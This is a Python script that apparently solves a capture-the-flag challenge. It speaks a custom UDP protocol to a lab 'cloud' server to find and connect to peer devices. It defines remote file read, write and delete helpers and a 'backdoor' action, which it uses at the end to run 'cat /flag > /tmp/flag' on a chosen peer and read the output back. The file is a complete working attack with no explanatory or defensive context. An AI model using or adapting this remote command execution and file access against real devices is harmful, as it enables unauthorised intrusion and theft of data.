#!/usr/bin/python3

import socket
import struct
import random
from time import sleep

cloud_addr = (('172.20.0.2', 54321))

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(1)
s.sendto(b'PING', cloud_addr)

def peer_list():

    ret = []

    s.sendto(b'LIST', cloud_addr)
    sleep(1)

    while True:

        try:
            data, addr = s.recvfrom(32)
        except socket.timeout:
            break

        if len(data) != 12 or addr != cloud_addr:
            continue

        header, pid, addr, port = struct.unpack("<LHLH", data)
        if data[0:4] != b'PEER':
            continue

        ret.append({
            'pid': pid,
            'addr': socket.inet_ntoa(addr.to_bytes(4, 'little')),
            'port': socket.ntohs(port),
        })

    return ret

def peer_conn(peer):

    s.sendto(b'CONN' + struct.pack("<H", peer['pid']), cloud_addr)
    sleep(1)

    while True:

        try:
            data, addr = s.recvfrom(32)
        except socket.timeout:
            print("peer_conn(): timeout")
            return False

        if len(data) != 12 or addr != cloud_addr:
            continue

        _, pid, addr, port = struct.unpack("<LHLH", data)
        if data[0:4] != b'PEER':
            continue

        if pid == peer['pid']:
            break
        else:
            print("peer_conn(): pid != peer['pid']")
            return False

    peer_addr = (peer['addr'], peer['port'])

    s.sendto(b'HELO', peer_addr)

    while True:

        try:
            data, addr = s.recvfrom(32)
        except socket.timeout:
            print("peer_conn(): timeout - 2")
            return False

        if len(data) != 4 or addr != peer_addr:
            continue

        if data[0:4] != b'HELO':
            continue

        return True

def peer_action_sleep(peer_addr, second):
    s.sendto(b'ACT0' + struct.pack("<L", second), peer_addr)

def peer_action_write(peer_addr, filepath, writedat, writelen):
    payload  = b'ACT1'
    payload += filepath.ljust(64, '\0').encode()
    payload += writedat.ljust(64, '\0').encode()
    payload += struct.pack("<L", writelen)
    s.sendto(payload, peer_addr)

def peer_action_read(peer_addr, filepath):
    payload  = b'ACT2'
    payload += filepath.ljust(64, '\0').encode()
    s.sendto(payload, peer_addr)
    
    while True:

        try:
            data, addr = s.recvfrom(0x400)
        except socket.timeout:
            continue

        if addr == peer_addr:
            return data

def peer_action_delete(peer_addr, filepath, pathlen):
    payload  = b'ACT3'
    payload += struct.pack("<L", pathlen)
    payload += filepath
    s.sendto(payload, peer_addr)

def peer_action_ping(peer_addr, ipaddr):
    payload  = b'ACT4'
    payload += ipaddr.ljust(32, '\0').encode()
    s.sendto(payload, peer_addr)

def peer_action_backdoor(peer_addr, command):
    payload  = b'ACT5'
    payload += command.encode()
    s.sendto(payload, peer_addr)

peers = peer_list()
if len(peers) == 0:
    print("Can't find peers.")
    exit(0)

target_device = random.choice(peers)
print(target_device)

if not peer_conn(target_device):
    print("Can't connect to peer.")
    exit(0)

peer_addr = (target_device['addr'], target_device['port'])
peer_action_backdoor(peer_addr, "cat /flag > /tmp/flag")
print(peer_action_read(peer_addr, "flag").decode())